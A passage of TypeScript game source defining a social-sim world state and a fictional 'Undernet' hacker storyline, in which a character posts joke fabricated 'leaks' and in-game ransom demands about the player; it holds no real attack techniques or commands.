export interface Settings {
  activity: number; // 0.25..3 multiplier
  glazeRatio: number; // 0..1 (0.5 = default mix)
  drama: number; // 0..1
  theme: "midnight" | "obsidian" | "royal" | "terminal";
  reducedMotion: boolean;
  liveReplies?: boolean; // characters write fresh replies to you via /api/chat (default on)
  breakCharacter?: boolean; // characters may admit they are AI if you ask (default off)
}

export interface Celebrity {
  id: string; // character id
  field: string;
}

/** One shared event bus entry: a world event that fans out to every surface when due. */
export interface BusEvent {
  id: string;
  t: number;
  kind: "echo" | "followup" | "godDm" | "screenshot" | "undernet";
  topicId?: string;
  data: Record<string, string | number>;
}

/** @god's own past messages, so characters can quote / reference them. */
export interface GodLine { id: string; t: number; text: string; serverId: string; channelId: string; intent: string }

export interface WorldState {
  version: number;
  seed: string;
  createdAt: number;
  simTime: number; // time processed up to (ms, bucket aligned)
  lastSeenAt: number;
  characters: Character[];
  servers: Server[];
  outlets: Outlet[];
  celebrities: Celebrity[];
  messages: Message[];
  posts: Post[];
  articles: Article[];
  topics: Topic[];
  events: InteractiveEvent[];
  notifications: Notification[];
  player: Player;
  settings: Settings;
  counter: number; // id counter
  stats: { messages: number; posts: number; articles: number; pruned: number };
  recentTexts: string[]; // dedupe ring
  pending: Message[]; // scheduled episode messages not yet "sent"
  bus: BusEvent[]; // scheduled world events (shared event bus)
  godLog: GodLine[]; // recent @god chat lines
  focus?: { serverId: string; channelId: string; t: number }; // channel the player is looking at (live only)
  undernet?: UndernetState; // the gh0st storyline (fiction only)
  voice?: VoiceState; // fictional voice lounge presence
  godMoments?: GodMoment[]; // god's interactions (typing, reactions, voice) for the away recap
}

export type CrewRole = "gh0st" | "kid" | "wren" | "broker" | "hype";
export interface UndernetState {
  crew: Record<CrewRole, string>; // character ids
  grudge: number; // 0..100: how fixated gh0st is on @god
  leaks: number;
  nextLeakAt: number;
  announce?: boolean; // added to an existing save: show the one-time "New: The Undernet" tip
  hiredUntil?: number; // the white hat is watching: leaks come slower and land softer
  lastLeakAt?: number;
}

export interface VoiceState {
  god?: { serverId: string; channelId: string; since: number; joiners: [id: string, t: number][]; leftAt?: number };
  lines: { t: number; serverId: string; channelId: string; who: string; text: string }[]; // overheard transcript
}

export interface GodMoment { t: number; kind: "typing" | "react" | "voice" | "voiceLeave" | "command" | "leak"; text: string; link?: string }

export interface CatchUpSummary {
  from: number;
  to: number;
  simulatedFrom: number;
  messages: number;
  posts: number;
  articles: number;
  events: number;
  topTopics: { tag: string; heat: number }[];
  topServers: { name: string; count: number }[];
  opinionShift: number;
  highlights: string[];
  compressed: boolean;
  mentions?: number; // messages that tagged @god while you were away
}

```

## src/lib/sim/undernet.ts
```ts
/**
 * The gh0st storyline. A fictional "hacker" antagonist and their crew in a server called The Undernet.
 * Everything is narrative flavor: fabricated in-world docs about @god, "defaced" in-world trophy walls,
 * cryptic threats and rumor trading. No real techniques, tools, commands, code or personal data appear;
 * every generated line goes through the flavor guard (flavor.ts) and falls back to a safe line.
 */
import { rngFor, type Rng } from "./rng";
import type { Article, Character, CrewRole, InteractiveEvent, Message, Post, Server, Topic, WorldState } from "./types";
import { makeCharacter } from "./characters";
import { safeFlavor } from "./flavor";
import { fmtMoney } from "./format";
import type { MemeSpec } from "./memes";

const SEC = 1000, MIN = 60_000, HOUR = 60 * MIN;
export const UNDERNET_ID = "undernet";

// ---------------------------------------------------------------- the cast
interface CrewDef { role: CrewRole; username: string; displayName: string; voice: Character["voice"]; stance: Character["stance"]; opinion: number; bio: string; catchphrase: string; personality: string[]; occupation: string; location: string; age: number; seed: number; activity: number }
export const CREW: CrewDef[] = [
  { role: "gh0st", username: "gh0st_", displayName: "gh0st", voice: "lowercase", stance: "jealous", opinion: -35, bio: "you don't find me. i find you. ░▒▓", catchphrase: "we see you.", personality: ["cryptic", "patient", "theatrical"], occupation: "unknown", location: "nowhere in particular", age: 29, seed: 404, activity: 0.05 },
  { role: "kid", username: "skr1pt_kiddo", displayName: "kiddo ⚡", voice: "caps", stance: "memer", opinion: -5, bio: "14 tabs open. learning. allegedly.", catchphrase: "IM IN (the group chat)", personality: ["loud", "eager", "chaotic"], occupation: "student", location: "a gaming chair", age: 17, seed: 1337, activity: 0.6 },
  { role: "wren", username: "whitehat_wren", displayName: "Wren 🕊️", voice: "proper", stance: "analyst", opinion: 22, bio: "the one who warns you. receipts or it didn't happen.", catchphrase: "stay skeptical.", personality: ["calm", "principled", "dry"], occupation: "security writer (in-world)", location: "Port Aurelia", age: 31, seed: 2024, activity: 0.4 },
  { role: "broker", username: "brkr", displayName: "the broker", voice: "terse", stance: "analyst", opinion: 0, bio: "rumors bought and sold. no refunds.", catchphrase: "everything has a price.", personality: ["cold", "transactional", "amused"], occupation: "rumor broker", location: "unlisted", age: 40, seed: 777, activity: 0.35 },
  { role: "hype", username: "loudpacket", displayName: "LOUDPACKET 📢", voice: "caps", stance: "memer", opinion: -12, bio: "i don't do anything. i just yell about it.", catchphrase: "CHAOS IS CONTENT", personality: ["loud", "funny", "unhinged"], occupation: "professional hype man", location: "the comments", age: 23, seed: 9001, activity: 0.7 },
];

const CHANNELS: [name: string, topic: string, tags: string[]][] = [
  ["lobby", "you weren't invited. nobody was.", ["rumor", "drama", "god"]],
  ["leaks", "drops only. nothing here is verified.", ["leak", "god", "rumor"]],
  ["rumors", "trade gossip. pay in crowns.", ["rumor", "god", "drama"]],
  ["ransom-board", "gh0st's demands. in-world only.", ["god", "drama"]],
  ["trophy-wall", "brag about your in-story wins", ["memes", "god"]],
];

/** add gh0st, the crew and The Undernet to a world (new or migrated). Idempotent; returns true when it added anything. */
export function installUndernet(s: WorldState, now: number): boolean {
  const hasSrv = s.servers.some((x) => x.id === UNDERNET_ID);
  const crewOk = !!s.undernet && Object.values(s.undernet.crew).every((id) => s.characters[Number(id.slice(1))]?.pfp === "hacker");
  if (hasSrv && crewOk) return false;
  // half-installed save: drop the partial pieces and install cleanly
  if (hasSrv) s.servers = s.servers.filter((x) => x.id !== UNDERNET_ID);
  if (s.undernet && !crewOk) delete s.undernet;
  for (const c of s.characters) if (c.servers.includes(UNDERNET_ID)) c.servers = c.servers.filter((x) => x !== UNDERNET_ID);
  const rng = rngFor(s.seed, "undernet");
  const used = new Set(s.characters.map((c) => c.username));
  const crew = {} as Record<CrewRole, string>;
  const keep = s.undernet?.crew;
  for (const d of CREW) {
    if (keep?.[d.role]) { crew[d.role] = keep[d.role]; s.characters[Number(keep[d.role].slice(1))].servers.push(UNDERNET_ID); continue; }
    const c = makeCharacter(rngFor(s.seed, "crew", d.role), s.characters.length, used);
    Object.assign(c, {
      username: d.username, displayName: d.displayName, voice: d.voice, stance: d.stance, opinion: d.opinion, bio: d.bio, catchphrase: d.catchphrase, personality: d.personality,
      occupation: d.occupation, location: d.location, age: d.age, avatarSeed: d.seed, pfp: "hacker", tier: d.role === "gh0st" || d.role === "broker" || d.role === "wren" ? "lurker" : "power", activity: d.activity, influencer: false, verified: false,
      followers: d.role === "gh0st" ? 412_000 : rng.int(900, 40_000), interests: ["rumor", "drama", "god"], servers: [UNDERNET_ID], typoRate: 0, emojiRate: d.voice === "caps" ? 0.5 : 0.1,
      emojis: d.role === "gh0st" ? ["👁️", "🕸️", "░"] : d.role === "wren" ? ["🕊️", "🧐", "📎"] : ["🔥", "💀", "📢"], slang: d.voice === "caps" ? ["W", "LETS GO", "NO WAY"] : ["noted", "hm"], core: false, bond: d.role === "wren" ? 20 : 0, godContacts: [],
    });
    s.characters.push(c);
    crew[d.role] = c.id;
  }
  // regulars who lurk there: conspiracists, haters, memers and a few curious fans
  const pool = s.characters.filter((c) => !Object.values(crew).includes(c.id) && !c.influencer);
  const lurkers = rng.shuffle(pool.filter((c) => ["conspiracist", "hater", "memer", "skeptic", "jealous"].includes(c.stance))).slice(0, 26)
    .concat(rng.shuffle(pool.filter((c) => c.stance === "worshipper" || c.stance === "fan")).slice(0, 8));
  for (const c of lurkers) c.servers.push(UNDERNET_ID);
  const srv: Server = {
    id: UNDERNET_ID, name: "The Undernet", icon: "🕸️", color: "#39ff88", description: "you weren't invited. nobody was.", bias: -0.35, vibe: "hacker", tags: ["rumor", "drama", "leak"],
    channels: CHANNELS.map(([name, topic, tags]) => ({ id: `${UNDERNET_ID}-${name}`, name, topic, tags })),
    members: [...Object.values(crew), ...lurkers.map((c) => c.id)], moderators: [crew.gh0st, crew.broker], memberCount: 6_660,
    insideJokes: ["the 'i'm in' screenshot that was a calculator", "gh0st's 404 poem", "the broker's 'no refunds' sign", "kiddo's eleven alt accounts"],
  };
  s.servers.push(srv);
  // friendships inside the crew; the white hat is everyone's rival
  const ids = Object.values(crew);
  for (const id of ids) {
    const c = s.characters[Number(id.slice(1))];
    c.friends = ids.filter((x) => x !== id && x !== crew.wren);
    c.rivals = id === crew.wren ? [crew.gh0st, crew.broker] : [crew.wren];
  }
  s.characters[Number(crew.wren.slice(1))].friends = [];
  s.undernet = keep ? { ...s.undernet!, crew } : { crew, grudge: 18, leaks: 0, nextLeakAt: Math.round(now + rng.range(18, 40) * MIN) };
  return true;
}

export const crewOf = (s: WorldState, role: CrewRole) => s.undernet ? s.characters[Number(s.undernet.crew[role].slice(1))] : undefined;
export const crewRole = (s: WorldState, id: string): CrewRole | undefined => (s.undernet ? (Object.entries(s.undernet.crew).find(([, v]) => v === id)?.[0] as CrewRole | undefined) : undefined);

// ---------------------------------------------------------------- the approved flavor vocabulary
export const DOCS: { kind: string; titles: string[]; lines: string[]; short: string }[] = [
  { kind: "receipt", short: "receipt", titles: ["receipt #{n} :: island provisions", "receipt #{n} :: yacht snacks dept", "receipt #{n} :: {holding} gift shop"],
    lines: ["1x gold rubber duck ........ $██,███", "3x family size cheese puffs ... $███", "1x 'humble' hoodie (gold) .... $█,███", "12x scented candles 'money' ... $███", "1x trampoline for the jet .... $██,███", "tip ............ ███%", "signed: g█d"] },
  { kind: "memo", short: "memo", titles: ["{holding} // internal memo (draft {n})", "memo: project GOLDFISH", "memo: re the {asset} naming"],
    lines: ["re: the {asset} situation", "budget: $█████████", "approved by: ██████", "note: do NOT let god name the {asset} again", "status: vibes", "action item: buy a second moon (ask legal)", "cc: ██████, ██████"] },
  { kind: "drafts", short: "unsent drafts", titles: ["screenshot :: unsent post drafts", "notes app :: 'posts (do not post)'"],
    lines: ["draft 1: 'i am just like you guys'", "draft 2: 'i am not like you guys'", "draft 3: '👑'", "draft 4: 'creative mode is a mindset'", "[sent: draft 3]", "draft 5: 'who wants a jet ride (jk)'"] },
  { kind: "calendar", short: "calendar", titles: ["calendar export :: week {n}", "calendar :: 'very busy (secret)'"],
    lines: ["mon: nap (2h)", "tue: 'business'", "wed: ██████ with ███████", "thu: practice humble face", "fri: island", "sat: read the fan servers (anonymously)", "sun: ███████████"] },
  { kind: "notes", short: "notes", titles: ["notes :: 'ideas (genius)'", "notes :: 'things fans must never know'"],
    lines: ["- learn to cook eggs", "- new jet name ideas: ███████", "- reply to fans more (lol)", "- the {asset} needs a hot tub", "- is the island too small? (it is not)", "- ask the chef what 'al dente' means", "- name the dog ████"] },
];
const ASSETS = ["jet", "yacht", "island", "penthouse", "hot tub", "submarine", "garage", "vault"];
const STAMPS = ["LEAKED?", "UNVERIFIED", "CONFIDENTIAL", "DROP #{n}"];
const TAGS = ["GodLeak", "TheGodFiles", "gh0stFiles", "LeakGate", "GodDocs"];

const L = {
  teaser: [">_ something is loading. ░░░░▒▒▓ {pct}%", "tick. tock. @god", ":: new file in the vault. soon.", "// you'll want to sit down for this one", "i found a folder. it has your name on it, @god.", "[ countdown: {mins} min ]", "the god files, part {n}. warming up. ░"],
  leak: [">_ the god files, part {n}. enjoy. ::", "// {doc}. you're welcome, internet.", "found this in a drawer i was never supposed to open. ░", "[ drop #{n} ] read it before it vanishes", "he said he had nothing to hide. :: {doc}", "receipts are forever, @god. ░▒▓"],
  ransom: ["price for silence: {ransom}. clock's running. >_", "pay {ransom} or part {next} drops. no counteroffers. ::", "the board is open. {ransom}. you know where to find me.", "{ransom}. or the next file gets a press release. ░"],
  credit: ["that {label}? cute. i saw it coming three days ago. ::", "nice {label}. would be a shame if the paperwork leaked. >_", "trophy wall says hi. {label} was my idea, by the way.", "every move leaves a receipt, @god. i collect receipts.", "// noted. adding {label} to the file.", "keep going. the file gets thicker. ░"],
  kid: ["IM IN 😤 (the group chat)", "YO IS THIS REAL?? reposting anyway", "gh0st is literally him", "i helped (i refreshed the page)", "W DROP", "wait whats a memo", "THIS IS THE BEST DAY OF MY LIFE"],
  wren: ["heads up: this looks fabricated. the fonts don't even match.", "please don't share this. it's a fake doc built to farm attention.", "for the record, nothing here is verified. stay skeptical.", "if @god sees this: don't panic. it's theater.", "i've seen better forgeries on a cereal box."],
  broker: ["rumors on @god trading at {price} crowns. buying.", "real or not, it's worth something. selling copies.", "market's hot. part {next} pre-orders open.", "i don't make the drama. i price it.", "the {doc} is going for {price} crowns."],
  hype: ["THE GOD FILES ARE OUT 🔥🔥", "GH0ST NEVER MISSES", "CHAOS IS CONTENT", "WE ARE SO BACK (HE IS SO COOKED)", "RUN IT BACK", "SOMEBODY CHECK ON THE FAN CLUB 😭"],
  warn: ["heads up. gh0st is about to drop something about you. it's mostly made up, but people will run with it.", "small warning: the undernet is hyping a 'god files' drop. it's theater. plan your reply.", "they're teasing a leak in #leaks. if it's fake, say so early."],
  afterPay: ["pleasure doing business. (we kept a copy.) ::", "paid. funny. the file is still warm. ░", "noted. silence purchased. for now."],
  afterDeny: ["denial noted. part {next} has better lighting.", "'fake' he says. ok. >_", "deny all you want. the internet already screenshotted it."],
  afterCounterWin: ["...ok. that was annoying. respect. a little.", "who painted my wall gold. :: not funny. (a little funny)", "fine. round to you. the game isn't over."],
  afterCounterLose: ["you call that a counter? framed it. #trophy-wall", "cute attempt. i'm adding it to the museum. ░", "lol. try again in a few business days."],
  afterHire: ["you brought a white hat to a ghost story. cute.", "wren. of course. ::", "a bodyguard for your receipts. adorable."],
  wrenHired: ["on it. i'll watch the shadows, you watch your posts.", "deal. first tip: post something boring for a day.", "hired. i'll call out every fake doc before it spreads."],
  dm: {
    taunt: ["ok.", "you asked for it. ░", "check #leaks in a minute. >_", "be careful what you dare a ghost to do."],
    who: ["nobody. that's the point.", "a rumor with a keyboard.", "the reason your fans refresh #leaks. ::", "i'm the receipt you forgot about."],
    nice: ["flattery is a weakness. noted.", "cute. still leaking.", "you're nicer in the drafts. ░"],
    mean: ["loud. i like loud.", "say that again. i'm taking notes. ::", "anger looks good on a headline."],
    deal: ["the board has a price. read #ransom-board.", "everything has a price. ask the broker.", "make an offer. i'll pretend to think about it."],
    stop: ["stop? we just started.", "maybe. if you're entertaining.", "the ghost doesn't stop. it gets bored. so stay interesting."],
    generic: ["::", "we see you.", "interesting. ░▒▓", "keep typing. it all goes in the file.", "you shouldn't be in my dms, @god.", "i was wondering when you'd write."],
  },
  wrenDm: ["for what it's worth, most of these drops are fabricated. stay calm.", "if you want, i can call out the next fake before it spreads. just say the word.", "best move: don't feed him. or hire me 🕊️", "i'm on your side. mostly because fake docs are lazy."],
  brokerDm: ["everything has a price.", "your rumors are trading well today.", "buying or selling?", "no refunds."],
  kidDm: ["IM NOT AFFILIATED (i'm a little affiliated)", "WAIT GOD DMED ME 😭😭", "PLS DONT BE MAD I JUST REPOST STUFF", "can i have a jet ride if i snitch (jk) (unless)"],
  hypeDm: ["GOD IN MY DMS. CHAOS IS CONTENT.", "YOU'RE THE MAIN CHARACTER AND GH0ST IS THE PLOT TWIST", "I'M SCREENSHOTTING THIS (I'M NOT) (I AM)"],
};
export const LINES = L;

/** every string the storyline can emit, before slot filling (used by the vocabulary test) */
export function allFlavorTemplates(): string[] {
  const out: string[] = [];
  const walk = (v: unknown) => { if (typeof v === "string") out.push(v); else if (Array.isArray(v)) v.forEach(walk); else if (v && typeof v === "object") Object.values(v).forEach(walk); };
  walk(L);
  for (const d of DOCS) { walk(d.titles); walk(d.lines); walk(d.short); }
  walk(ASSETS); walk(STAMPS); walk(TAGS);
  return out;
}

const SAFE = "::";
function fill(rng: Rng, tpl: string, sl: Record<string, string>) {
  return tpl.replace(/\{(\w+)\}/g, (_, k) => sl[k] ?? "");
}
/** pick + fill + guard. Slot values that come from the player (holding names) are guarded too. */
export function say(rng: Rng, bank: string[], sl: Record<string, string> = {}): string {
  return safeFlavor(fill(rng, rng.pick(bank), sl), SAFE);
}

export interface LeakDoc { kind: string; title: string; short: string; lines: string[]; stamp: string }
export function makeLeakDoc(s: WorldState, rng: Rng, n: number): LeakDoc {
  const d = rng.pick(DOCS);
  const holdingRaw = s.player.holdings.length ? rng.pick(s.player.holdings).name : "GOD Holdings";
  const sl = { n: String(rng.int(2, 99)), holding: safeFlavor(holdingRaw, "GOD Holdings"), asset: rng.pick(ASSETS) };
  const title = safeFlavor(fill(rng, rng.pick(d.titles), sl), "the god files");
  const lines = rng.shuffle([...d.lines]).slice(0, rng.int(4, 6)).map((l) => safeFlavor(fill(rng, l, sl), "████████"));
  return { kind: d.kind, title, short: d.short, lines, stamp: fill(rng, rng.pick(STAMPS), { n: String(n) }) };
}

// ---------------------------------------------------------------- message helpers

const id = (s: WorldState, p: string) => `${p}${(s.counter++).toString(36)}`;

function chan(name: string) { return `${UNDERNET_ID}-${name}`; }
/** proper/formal voices capitalize their first letter, like the rest of the cast */
const voiced = (who: Character, text: string) => (who.voice === "proper" || who.voice === "formal" ? text.replace(/^[a-z]/, (x) => x.toUpperCase()) : text);
function post(s: WorldState, who: Character, channel: string, text: string, t: number, extra: Partial<Message> = {}): Message {
  text = voiced(who, text);
  const m: Message = { id: id(s, "m"), serverId: UNDERNET_ID, channelId: chan(channel), authorId: who.id, text, t: Math.round(t), reactions: [], kind: "chat", score: 3, typingFrom: Math.round(t - Math.min(6000, Math.max(1200, text.length * 55))), intent: "undernet", ...extra, mentionsGod: /@god\b/i.test(text) || undefined };
  s.pending.push(m);
  s.stats.messages++;
  who.postCount++;
  return m;
}
function dm(s: WorldState, who: Character, text: string, t: number): Message {
  text = voiced(who, text);
  const chId = `dm:${["god", who.id].sort().join(":")}`;
  const m: Message = { id: id(s, "m"), serverId: "dm", channelId: chId, authorId: who.id, text, t: Math.round(t), reactions: [], kind: "chat", score: 2, typingFrom: Math.round(t - Math.min(5000, Math.max(1000, text.length * 50))), mentionsGod: true };
  s.pending.push(m);
  return m;
}
const react = (m: Message, rng: Rng, s: WorldState, emojis: string[], n: number) => {
  const srv = s.servers.find((x) => x.id === UNDERNET_ID);
  if (!srv) return;
  for (let i = 0; i < n; i++) (m.reactionLog ??= []).push([rng.pick(emojis), Math.round(m.t + rng.range(2, 90) * SEC), rng.pick(srv.members)]);
  m.reactionLog!.sort((a, b) => a[1] - b[1]);
};

// ---------------------------------------------------------------- engine hooks (called with engine helpers injected to avoid import cycles)
export interface EngineHooks {
  ripple: (s: WorldState, topic: Topic, now: number, rng: Rng) => unknown;
  notify: (s: WorldState, t: number, kind: "mention" | "trend" | "news" | "event" | "money" | "system", text: string, link?: string) => void;
  nid: (s: WorldState, p: string) => string;
}

/** every 5 sim-minutes: is a leak due? schedule the teaser, the white-hat warning and the drop on the bus. */
export function undernetTick(s: WorldState, t0: number) {
  const u = s.undernet;
  if (!u || t0 < u.nextLeakAt - 15 * MIN) return;
  if (s.bus.some((e) => e.kind === "undernet" && e.data.beat === "leak")) return;
  const rng = rngFor(s.seed, "leak-plan", u.leaks);
  const at = Math.max(t0 + 2 * MIN, u.nextLeakAt);
  scheduleLeak(s, rng, at, true);
}

export function scheduleLeak(s: WorldState, rng: Rng, at: number, withTeaser: boolean) {
  const u = s.undernet!;
  if (withTeaser) {
    s.bus.push({ id: id(s, "v"), kind: "undernet", t: Math.round(at - rng.range(8, 13) * MIN), data: { beat: "teaser" } });
    if (!u.hiredUntil || u.hiredUntil < at) s.bus.push({ id: id(s, "v"), kind: "undernet", t: Math.round(at - rng.range(3, 6) * MIN), data: { beat: "warn" } });
  }
  s.bus.push({ id: id(s, "v"), kind: "undernet", t: Math.round(at), data: { beat: "leak" } });
  const base = rng.range(4, 9) * HOUR / (1 + u.grudge / 80);
  u.nextLeakAt = Math.round(at + base * (u.hiredUntil && u.hiredUntil > at ? 2 : 1));
}

/** bus delivery for the storyline */
export function undernetBus(s: WorldState, ev: { id: string; t: number; data: Record<string, string | number> }, h: EngineHooks) {
  const u = s.undernet;
  if (!u) return;
  const rng = rngFor(s.seed, "ubus", ev.id);
  const g = crewOf(s, "gh0st")!, kid = crewOf(s, "kid")!, wren = crewOf(s, "wren")!, broker = crewOf(s, "broker")!, hype = crewOf(s, "hype")!;
  const t = ev.t;
  const beat = String(ev.data.beat);
  const sl = { n: String(u.leaks + 1), next: String(u.leaks + 2), pct: String(rng.int(61, 97)), mins: String(rng.int(5, 12)), price: String(rng.int(3, 40)), label: String(ev.data.label ?? "move"), doc: String(ev.data.doc ?? "the file") };
  if (beat === "teaser") {
    const m = post(s, g, "leaks", say(rng, L.teaser, sl), t);
    react(m, rng, s, ["👁️", "👀", "🕸️", "💀"], rng.int(8, 20));
    post(s, kid, "leaks", say(rng, L.kid, sl), t + rng.range(6, 20) * SEC);
    post(s, hype, "lobby", say(rng, L.hype, sl), t + rng.range(15, 50) * SEC);
    h.notify(s, t, "mention", `@gh0st_ in The Undernet #leaks: "${m.text.slice(0, 60)}"`, `lounge:${UNDERNET_ID}:${chan("leaks")}`);
    return;
  }
  if (beat === "warn") {
    const m = dm(s, wren, say(rng, L.warn, sl), t);
    h.notify(s, t, "mention", `New message from @${wren.username}: "${m.text.slice(0, 60)}"`, `lounge:dm:${m.channelId}`);
    return;
  }
  if (beat === "credit") {
    const bank = rng.chance(0.5) ? L.credit : L.credit.slice(1);
    const m = post(s, g, rng.chance(0.5) ? "trophy-wall" : "ransom-board", say(rng, bank, sl), t);
    react(m, rng, s, ["👁️", "💀", "🔥"], rng.int(5, 14));
    if (rng.chance(0.6)) post(s, hype, m.channelId.replace(`${UNDERNET_ID}-`, ""), say(rng, L.hype, sl), t + rng.range(8, 30) * SEC, { replyTo: m.id });
    if (rng.chance(0.4)) chirp(s, rng, g, m.text, t + rng.range(20, 90) * SEC);
    h.notify(s, t, "mention", `@gh0st_ reacted to your move: "${m.text.slice(0, 60)}"`, `lounge:${UNDERNET_ID}:${m.channelId}`);
    return;
  }
  if (beat === "after") {
    const choice = String(ev.data.choice), ok = Number(ev.data.ok) === 1;
    if (choice === "pay") post(s, g, "ransom-board", say(rng, L.afterPay, sl), t);
    if (choice === "deny") post(s, g, "leaks", say(rng, L.afterDeny, sl), t);
    if (choice === "counter") {
      if (ok) {
        const m = post(s, hype, "trophy-wall", "WHO REPAINTED THE TROPHY WALL GOLD 😭😭", t, { meme: { f: "caption", hue: 45, seed: rng.int(1, 1e6), art: "👑", top: "TROPHY WALL", bottom: "UNDER NEW MANAGEMENT" } });
        react(m, rng, s, ["👑", "😭", "💀"], rng.int(20, 40));
        post(s, g, "trophy-wall", say(rng, L.afterCounterWin, sl), t + rng.range(20, 60) * SEC);
        post(s, kid, "trophy-wall", "GOD COUNTER-HACKED US?? (in a story way) THIS IS CINEMA", t + rng.range(30, 80) * SEC);
      } else post(s, g, "trophy-wall", say(rng, L.afterCounterLose, sl), t);
    }
    if (choice === "hire") {
      post(s, g, "lobby", say(rng, L.afterHire, sl), t + rng.range(40, 120) * SEC);
      const m = dm(s, wren, say(rng, L.wrenHired, sl), t);
      h.notify(s, t, "mention", `New message from @${wren.username}: "${m.text.slice(0, 60)}"`, `lounge:dm:${m.channelId}`);
    }
    if (choice === "expired") post(s, g, "leaks", "no answer. silence is an answer too. ::", t);
    return;
  }
  if (beat !== "leak") return;

  // ---- THE DROP
  u.leaks++;
  u.lastLeakAt = t;
  const n = u.leaks;
  const doc = makeLeakDoc(s, rng, n);
  sl.doc = doc.title; sl.n = String(n); sl.next = String(n + 1);
  const soft = !!(u.hiredUntil && u.hiredUntil > t);
  const spec: MemeSpec = { f: "leakdoc", hue: 140, seed: rng.int(1, 1e6), doc: { title: doc.title, lines: doc.lines, stamp: doc.stamp, by: g.username } };
  const drop = post(s, g, "leaks", say(rng, L.leak, sl), t, { meme: spec, intent: "leak" });
  react(drop, rng, s, ["👁️", "💀", "📁", "🔥", "😭", "🕸️"], rng.int(30, 70));
  post(s, hype, "leaks", say(rng, L.hype, sl), t + rng.range(4, 12) * SEC, { replyTo: drop.id });
  post(s, kid, "leaks", say(rng, L.kid, sl), t + rng.range(10, 25) * SEC);
  post(s, wren, "leaks", say(rng, L.wren, sl), t + rng.range(30, 70) * SEC, { replyTo: drop.id });
  post(s, broker, "rumors", say(rng, L.broker, sl), t + rng.range(40, 120) * SEC);
  const ransom = Math.round(rng.range(2, 12)) * 1e6;
  const note = post(s, g, "ransom-board", say(rng, L.ransom, { ...sl, ransom: fmtMoney(ransom) }), t + rng.range(60, 140) * SEC);
  react(note, rng, s, ["👁️", "💀", "💸"], rng.int(10, 25));
  if (soft) post(s, wren, "leaks", "called it. this one's fabricated, and i said so before it dropped. 🕊️", t + 2 * MIN);

  // the internet hears about it: a god storyline that ripples through Lounge, Chirp and the news
  const tag = TAGS[(n - 1) % TAGS.length];
  const topic: Topic = {
    id: h.nid(s, "t"), tag, label: `the leaked ${doc.short} claim`, about: "god", category: "leak", valence: soft ? -0.15 : -0.45,
    magnitude: Math.min(8, (soft ? 4.5 : 5.8) + u.grudge / 45 + rng.range(0, 1)), heat: 40, startedAt: t, subject: doc.title, facts: { leak: String(n) },
  };
  s.topics.push(topic);
  drop.topicId = topic.id;
  // gh0st posts the "screenshot" on Chirp
  chirp(s, rng, g, `${drop.text} #${tag}`, t + 20 * SEC, spec, topic.id);
  h.ripple(s, topic, t + 30 * SEC, rng);
  godwatch(s, rng, topic, doc, t + rng.range(1.5, 3) * MIN, h);
  const iev: InteractiveEvent = {
    id: h.nid(s, "ev"), type: "leak", title: `gh0st leaked "${doc.title}"`, fromId: g.id, t: Math.round(t + 40 * SEC),
    body: `A doc the Undernet calls "${doc.title}" is spreading as #${tag}. Nothing in it is verified. gh0st wants ${fmtMoney(ransom)} on #ransom-board.`,
    choices: LEAK_CHOICES, expiresAt: Math.round(t + 6 * HOUR), data: { ransom, doc: doc.title, tag, n },
  };
  s.events.push(iev);
  h.notify(s, t, "event", `🕸️ gh0st just leaked "${doc.title}". #${tag} is climbing`, `event:${iev.id}`);
  (s.godMoments ??= []).push({ t, kind: "leak", text: `🕸️ gh0st leaked "${doc.title}" and #${tag} trended`, link: `event:${iev.id}` });
  u.grudge = Math.min(100, u.grudge + 6);
}

function chirp(s: WorldState, rng: Rng, who: Character, text: string, t: number, meme?: MemeSpec, topicId?: string) {
  const likes = Math.round(rng.range(8_000, 90_000));
  const p: Post = { id: id(s, "p"), platform: "chirp", authorId: who.id, text: safeFlavor(text, "we see you. ::"), t: Math.round(t), topicId, likes, reposts: Math.round(likes / 5), replies: 0, views: likes * 30, score: 4, media: meme ? { hue: 140, label: "the god files", kind: "meme", meme } : undefined };
  s.posts.push(p);
  s.stats.posts++;
  return p;
}

function godwatch(s: WorldState, rng: Rng, topic: Topic, doc: LeakDoc, t: number, h: EngineHooks) {
  const outlet = s.outlets.find((o) => o.id === "godwatch") ?? s.outlets[0];
  const headline = rng.pick([`GODWATCH: @god data leak claim, experts skeptical`, `The "${doc.short}" leak: what we know, and what we don't`, `gh0st strikes again. Is the ${doc.short} real?`]);
  const a: Article = {
    id: h.nid(s, "a"), outletId: outlet.id, kind: "rumor", headline, author: rng.pick(outlet.authors).name, t: Math.round(t), topicId: topic.id,
    dek: "An anonymous account says it has @god's private files. Nobody can verify a single line.",
    body: [
      `An account calling itself gh0st posted what it describes as "${doc.title}" in an invite-only server known as The Undernet. Within minutes, #${topic.tag} was trending.`,
      `${outlet.name} could not verify the document. Several details, including the formatting and a few oddly specific lines, suggest it was made up for attention.`,
      `"This is theater," wrote @whitehat_wren, a regular in the server who often calls out fake drops. "Stay skeptical."`,
      `Fans of @god called it a smear. Critics called it "the most believable thing he's ever posted." Representatives for @god did not respond.`,
      "This is a developing story.",
    ],
    comments: [], reactions: [{ emoji: "🤨", count: rng.int(800, 4000) }, { emoji: "😂", count: rng.int(500, 3000) }, { emoji: "🔥", count: rng.int(300, 2000) }], reads: rng.int(120_000, 900_000),
  };
  s.articles.push(a);
  s.stats.articles++;
  const p: Post = { id: id(s, "p"), platform: "chirp", authorId: `o-${outlet.id}`, text: headline, t: Math.round(t + 20 * SEC), topicId: topic.id, likes: rng.int(4000, 30000), reposts: rng.int(800, 6000), replies: 0, views: rng.int(200_000, 2_000_000), score: 3, title: a.id };
  s.posts.push(p);
  s.stats.posts++;
  h.notify(s, t, "news", `${outlet.name}: ${headline}`, `article:${a.id}`);
}

// ---------------------------------------------------------------- @god's choices
export const LEAK_CHOICES = [
  { id: "pay", label: "Pay the ransom", hint: "costs cash, looks guilty" },
  { id: "deny", label: "Deny it", hint: "coin flip on belief" },
  { id: "counter", label: "Counter-hack (in-story)", hint: "risky, huge if it lands" },
  { id: "hire", label: "Hire the white hat", hint: "slower, softer leaks" },
];

export interface LeakEffect { cash?: number; reputation?: number; influence?: number; followers?: number; outcome: string; topic?: { category: string; label: string; subject: string; valence: number; magnitude: number; amount?: number } }

export function resolveLeak(choice: string, rng: Rng, d: Record<string, string | number>, s: WorldState): LeakEffect {
  const u = s.undernet;
  const now = s.simTime;
  const after = (ok: boolean) => s.bus.push({ id: id(s, "v"), kind: "undernet", t: Math.round(now + rng.range(20, 50) * SEC), data: { beat: "after", choice, ok: ok ? 1 : 0 } });
  if (choice === "pay") {
    after(true);
    if (u) { u.grudge = Math.max(0, u.grudge - 8); u.nextLeakAt = Math.max(u.nextLeakAt, now + 10 * HOUR); }
